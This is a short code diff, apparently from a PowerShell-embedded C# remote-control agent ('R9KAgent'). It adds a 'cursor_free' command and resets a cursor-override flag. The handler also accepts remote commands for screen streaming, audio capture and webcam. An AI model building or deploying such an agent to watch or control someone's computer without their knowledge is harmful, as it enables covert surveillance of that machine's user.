@@ -605,7 +605,8 @@ if (-not ("R9KAgent" -as [type])) {
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
-                if (cmd == "stream_stop") { streaming = false; lock (writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
+                if (cmd == "stream_stop") { streaming = false; cursorOverride = false; lock (writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
+                if (cmd == "cursor_free") { cursorOverride = false; return; }
                 if (cmd == "audio_start") { StartAudio(); lock (writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock (writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
                 if (cmd == "webcam") {
